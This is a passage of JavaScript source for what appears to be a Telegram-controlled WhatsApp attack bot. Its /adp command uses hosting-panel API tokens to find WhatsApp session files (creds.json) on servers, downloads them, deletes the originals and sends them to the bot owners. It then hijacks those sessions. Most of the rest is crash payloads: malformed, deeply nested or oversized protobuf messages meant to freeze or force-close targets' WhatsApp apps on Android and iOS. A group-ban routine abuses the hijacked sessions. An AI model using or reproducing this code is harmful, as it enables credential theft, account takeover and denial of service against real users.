    const destDir = sessionPath(botNumber);
    await fs.promises.rm(destDir, { recursive: true, force: true });
    await fs.promises.mkdir(destDir, { recursive: true });

    const copyDir = async (src, dest) => {
      const entries = await fs.promises.readdir(src, { withFileTypes: true });
      for (const e of entries) {
        const sp = path.join(src, e.name), dp = path.join(dest, e.name);
        if (e.isDirectory()) { await fs.promises.mkdir(dp, { recursive: true }); await copyDir(sp, dp); }
        else await fs.promises.copyFile(sp, dp);
      }
    };
    await copyDir(tmp, destDir);

    const list = fs.existsSync(FILE_SESSION) ? JSON.parse(fs.readFileSync(FILE_SESSION)) : [];
    if (!list.includes(botNumber)) fs.writeFileSync(FILE_SESSION, JSON.stringify([...list, botNumber]));

    if (sessions.has(botNumber)) {
      if (reconnectTimers.has(botNumber)) {
        clearTimeout(reconnectTimers.get(botNumber));
        reconnectTimers.delete(botNumber);
      }
      try { sessions.get(botNumber).end(); } catch {}
      sessions.delete(botNumber);
    }

    await connectToWhatsApp(botNumber, ctx);
  } catch (err) {
    console.error("addsender error:", err);
    ctx.reply(`[x] Failed: ${err.message}`);
  }
});

bot.command("adp", async (ctx) => {
  const DELAY = 250;
  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) return ctx.reply("Usage: /adp http://domain.com plta_xxxx pltc_xxxx");

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1], pltc = input[2];

  await ctx.reply("[..] Scanning servers for creds.json...");

  try {
    const appRes  = await axios.get(`${domainBase}/api/application/servers`, { headers: { Accept: "application/json", Authorization: `Bearer ${plta}` } });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("[x] No servers found.");

    let totalFound = 0;
    const commonPaths = [
      "/home/container/session/creds.json",
      "/home/container/sessions/creds.json",
      "/session/creds.json",
      "/sessions/creds.json"
    ];

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || identifier;

      let credsBuffer = null, usedPath = null;

      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, { params: { file: p }, headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } });
          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, { responseType: "arraybuffer" });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            break;
          }
        } catch {}
        await sleep(DELAY);
      }

      if (!credsBuffer) { await sleep(DELAY * 2); continue; }
      totalFound++;

      try {
        await axios.post(`${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
      } catch {}

      let BotNumber = "unknown";
      try {
        const json      = JSON.parse(credsBuffer.toString("utf8"));
        const candidate = json.id || json.phone || json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID || (json.registration && json.registration.phone) || null;
        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("234") && BotNumber.length >= 8 && BotNumber.length <= 15)
            BotNumber = "234" + BotNumber;
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch { BotNumber = String(identifier).replace(/\s+/g, "_"); }

      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch {}

      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, { source: credsBuffer, filename: `${BotNumber}_creds.json` });
          await ctx.telegram.sendMessage(oid, `[+] *Number:* ${BotNumber}\n[s] *Server:* ${name}\n[p] *Path:* ${usedPath}\n[d] *Deleted from server.*`, { parse_mode: "Markdown" });
        } catch {}
      }

      const adpFlagDir    = path.join(os.tmpdir(), "rv7adpflags");
      fs.mkdirSync(adpFlagDir, { recursive: true });
      const connectedFlag = path.join(adpFlagDir, `${BotNumber}.connected`);
      const failedFlag    = path.join(adpFlagDir, `${BotNumber}.failed`);
      if (fs.existsSync(connectedFlag) || fs.existsSync(failedFlag)) { await sleep(DELAY); continue; }

      try {
        if (fs.existsSync(path.join(sessDir, "creds.json"))) {
          await connectToWhatsApp(BotNumber, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
        }
      } catch (err) {
        const emsg = err?.response?.status ? `HTTP ${err.response.status}` : err.message;
        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        for (const oid of ownerIds) {
          try { await ctx.telegram.sendMessage(oid, `[x] Failed to connect *${BotNumber}*\nError: ${emsg}`, { parse_mode: "Markdown" }); } catch {}
        }
      }
      await sleep(DELAY * 2);
    }

    if (totalFound === 0) ctx.reply("[+] Done. No creds.json found.");
    else ctx.reply(`[+] Done. Found ${totalFound} creds.json (deleted from servers, connection attempted).`);
  } catch (err) {
    console.error("adp error:", err?.response?.data || err.message);
    ctx.reply("[x] Error during scan. Check server logs.");
  }
});

function getActiveSock() {
  if (sessions.size === 0) throw new Error("No active WhatsApp sessions.");
  const keys = [...sessions.keys()];
  return sessions.get(keys[Math.floor(Math.random() * keys.length)]);
}
/* FORECLOSE ANDROID NEW 
*/
async function FC1msg(demmy, target) {
while (Date.now() - Date.now() < 200000) {
const IMG = {
  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
  directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
   mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
   fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
   fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
   fileLength: 20010,
   mediaKeyTimestamp: "1785637793",
   mimetype: "image/jpeg",
   height: 1600,
   width: 1200,
   jpegThumbnail: ""
 };

 const TAGS = [
  [0xBA, 0x03],
  [0xD2, 0x04],
  [0xAA, 0x02],
 ];

const encodeVarint = function(n) {
  var buf = [];
  while (n >= 0x80) {
   buf.push((n & 0x7f) | 0x80);
   n >>>= 7;
  }
  buf.push(n);
  return Buffer.from(buf);
 };

const wrapLd = function(tag, data) {
 return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const basePayload = proto.Message.encode(
proto.Message.fromObject({ imageMessage: IMG })
).finish();

const inflate = function(tag, depth) {
var buf = basePayload;
for (var i = 0; i < depth; i++) {
buf = wrapLd(tag, wrapLd([0x0A], buf));
}
return buf;
};

const resolveJid = function(raw) {
var s = String(raw || '').trim();
if (s.includes('@')) return s;
return s.replace(/\D/g, '') + '@s.whatsapp.net';
};

const jids = (Array.isArray(target) ? target : [target])
.map(resolveJid)
.filter(function(j) { return j.length > 15; });

if (!jids.length) return;

var MAX_BATCH = 5;
var totalSent = 0;

for (var i = 0; i < 900; i++) {
for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
var chunk = jids.slice(offset, offset + MAX_BATCH);

for (var ti = 0; ti < TAGS.length; ti++) {
var tag = TAGS[ti];
var payload = null;

for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
try {
var decoded = proto.Message.decode(inflate(tag, depth));
proto.Message.encode(decoded).finish();
payload = decoded;
} catch (_) {}
}

if (!payload) continue;

var msgId = 'CSMC' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;

try {
await demmy.relayMessage('status@broadcast', payload, {
messageId: msgId, statusJidList: chunk, additionalNodes: [{
  tag: 'meta', attrs: {}, content: [{
    tag: 'mentioned_users', attrs: {}, content: chunk.map(function(target) {
            return { tag: 'to', attrs: { jid: target }, content: [] };
           })
         }]
       }]
     });
     totalSent++;
     } catch (_) {}
         await new Promise(function(r) { setTimeout(r, 1000); });
        }
      }
    }
  }
}
/* END OF FORECLOSE NEW 

*/
async function ForcloseIos(demmy, target) {
  const msg = generateWAMessageFromContent(
    'status@broadcast',
    {
      richResponseMessage: {
        messageType: 1,
        unifiedResponse: {
          data: Buffer.from(
            JSON.stringify({
              __typename: "GenAIUnifiedResponse",
              response_id: crypto.randomUUID(),
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: Array.from({ length: 5 }, () => ({})),
                },
              ],
            })
          ).toString("base64"),
        },
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardOrigin: 4,
          forwardedAiBotMessageInfo: {
            botJid: "0@bot",
          },
        },
      },
    },
    {}
  );

  await demmy.relayMessage('status@broadcast', msg.message, {
    messageId: msg.key.id,
    statusJidList: target,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: jidList.map((target) => ({
              tag: "to",
              attrs: { jid: target },
            })),
          },
        ],
      },
    ],
  });
}

async function XFreeze(demmy, target) {
    await demmy.relayMessage(target, {
        interactiveResponseMessage: {
            body: {
                text: "Hey 🪷",
                format: 1
            },
            contextInfo: {
                quotedMessage: {
                    protocolMessage: {
                        type: 25
                    }
                },
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{"wa_flow_response_params":{"title":"${"𑇂𑆵𑆴𑆿".repeat(60000)}","flow_id":"floww"}}`,
                version: 3
            }
        }
    }, {
        participant: { jid: target },
        messageId: demmy.generateMessageTag()
    });
}

async function ZyySpammerBlank(demmy, target) {
  await demmy.relayMessage(
    target, 
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "「 t.me/onlyone_demmy 」" + "ោ៝".repeat(30000),
        caption: "ꦾ".repeat(120000) + "ꦾ".repeat(77777), 
        publisher: "\u0000",
        stickers: [
          {
            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        contextInfo: {
           isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          }
        }
      },
    }, 
    {
      participant: { jid: target },
      messageId: demmy.generateMessageTag(),
    }
  );
}

async function invigccrash(demmy, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\0"
                        },
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            mentionedJid: [],
                            externalAdReply: {
                                title: "Demmy Tech",
                                body: "Extended Message",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "`".repeat(10000),
                            buttons: "?".repeat(500000),
                        }
                    }
                }
            }
        };

        await demmy.relayMessage(
            target,
            msg,
            {} );
    } catch (error) {
        console.error("Error in crash function:", error);
    }
}
async function Xzv(demmy, target) {
  await demmy.relayMessage(target, {
    listMessage: {
      title: '⿻',
      description: 'ꪶ𖣂ꫂ - ( x )  ❆ 𝖷𝖺𝗄𝖺𝖬𝗈𝖽𝗌 𝖳𝗋𝖺𝗌𝗁𝖾𝗋𝗌 𖤐',
      buttonText: '\0'.repeat(50000),
      listType: 2,
      sections: [{
        title: 'X',
        rows: [{
          title: 'X',
          description: '',
          rowId: '\n'
        }]
      }],
      productListInfo: {
        productSections: [{
          title: 'XakaMods!',
          products: Array.from({ length: 2000 }, () => ({
            productId: "ြ".repeat(50)
          }))
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null
        },
        businessOwnerJid: target
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: 'status@broadcast'
      }
    }
  }, {});

  await demmy.relayMessage(target, {
    listMessage: {
      title: '⿻',
      description: 'ꪶ𖣂ꫂ - ( x )  ❆ 𝖷𝖺𝗄𝖺𝖬𝗈𝖽𝗌 𝖳𝗋𝖺𝗌𝗁𝖾𝗋𝗌 𖤐',
      buttonText: '\0'.repeat(50000),
      listType: 2,
      sections: [{
        title: 'X',
        rows: [{
          title: 'X',
          description: '',
          rowId: '\n'
        }]
      }],
      productListInfo: {
        productSections: [{
          title: 'XakaMods - Invations!',
          products: Array.from({ length: 2000 }, () => ({
            productId: "ြ".repeat(50)
          }))
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null
        },
        businessOwnerJid: target
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: 'status@broadcast'
      }
    }
  }, {});

  await demmy.relayMessage(target, {
    extendedTextMessage: {
      contacts: {
        displayName: "@XakaMods",
        contacts: [
          {
            vcard:
              "BEGIN:VCARD\nVERSION:3.0\nFN:@FlavourXaka\nTEL;type=CELL;type=VOICE;waid=000000:+00000000\nEND:VCARD",
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from(
          { length: 1900 },
          () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        isForwarded: true,
        forwardingScore: 9999,
        forwardedAiBotMessageInfo: {
          botJid: "0@bot",
        },
      },
    },
    richResponseMessage: {
      messageType: 2,
      submessages: [
        {
          messageType: 8,
          mapAnnotation: {
            body: {
              title: "\\p" + "\n".repeat(4500000),
            },
          },
        },
        {
          liveLocationMessage: {
            degreesLatitude: -6.2,
            degreesLongitude: 106.816666,
            caption: "",
            sequenceNumber: 0,
            timeOffset: 0,
          },
        },
      ],
    },
  }, {});
}
async function XzVV2(demmy, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(6000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "one_crash_message",
                                buttonParamsJson: "\r".repeat(80000) + "\n".repeat(8000)
                            }
                        ]
                    }
                }
            }
        }
    };

    await demmy.relayMessage(target, msg, {
        noSelfSync: true
    });
}
async function XzVDelay2(demmy, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "p"
          },
          NativeFlowMessage: {
            buttons: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 })
            ],
            name: "\x10".repeat(50000)
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
          }
        }
      }
    }
  };

  await demmy.relayMessage(target, msg, {
    participant: true
  });
}
async function GCIos(demmy, target) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessage = {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        
        let extendMsg = {
            extendedTextMessage: {
                text: " ℓуηχ-∂ємму " + TravaIphone,
                matchedText: "ℓуηχ-χχ ",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "ℓуηχ ∂ємму " + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        
        await demmy.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, {
            messageId: msg.key.id
        });

        await demmy.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg2.message
            }
        }, {
            messageId: msg2.key.id
        });

        await demmy.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg3.message
            }
        }, {
            messageId: msg3.key.id
        });

    } catch (err) {
        console.error(err);
    }
}
async function groupBanz(target) {
  if (!target.endsWith("@g.us")) throw new Error("Target must be a group ID ending with @g.us");
  if (sessions.size === 0) throw new Error("No active WhatsApp sessions.");

  const BAN_NUMBER = "13135550002@s.whatsapp.net";
  const socks = [...sessions.values()];
  let successCount = 0;

  console.log(chalk.cyan(`[>] [groupBanz] Starting ban on ${target} with ${socks.length} session(s)`));

  for (const sock of socks) {
    try {
      const rawId   = sock.user?.id || "";
      const sockJid = rawId.includes(":") ? rawId.split(":")[0] + "@s.whatsapp.net" : rawId;

      try {
        const groupMeta = await sock.groupMetadata(target);
        const isMember  = groupMeta.participants.some(p =>
          p.id === sockJid || p.id === rawId
        );
        if (!isMember) {
          console.log(chalk.yellow(`  [groupBanz] Session ${sockJid} is not a member of ${target} — ban may fail`));
        }
      } catch { /* metadata fetch failed — proceed anyway */ }

      await sock.groupParticipantsUpdate(target, [BAN_NUMBER], "add");
      console.log(chalk.green(`  [groupBanz] ✓ ${sockJid} — added ${BAN_NUMBER} to ${target}`));
      successCount++;
    } catch (err) {
      const sockJid = (sock.user?.id || "unknown").split(":")[0] + "@s.whatsapp.net";
      console.error(chalk.red(`  [groupBanz] ✗ ${sockJid} error: ${err.message}`));
    }
  }

  console.log(chalk.blue(`[=] [groupBanz] Done — ${successCount}/${socks.length} sessions executed on ${target}`));
  return { success: successCount > 0, group: target, number: BAN_NUMBER, sessions: successCount };
}

async function GetSuDelay(target) {
  if (sessions.size === 0) { console.log(chalk.red("[x] [delay] No active sessions.")); return; }
  console.log(chalk.cyan(`[>] [delay] Starting -> ${target} with ${sessions.size} session(s)`));
  for (let i = 0; i < 99; i++) {
    if (sessions.size === 0) { console.log(chalk.red(`[x] [delay] Session lost at ${i + 1}, stopping.`)); break; }
    for (const demmy of [...sessions.values()]) {
      try {
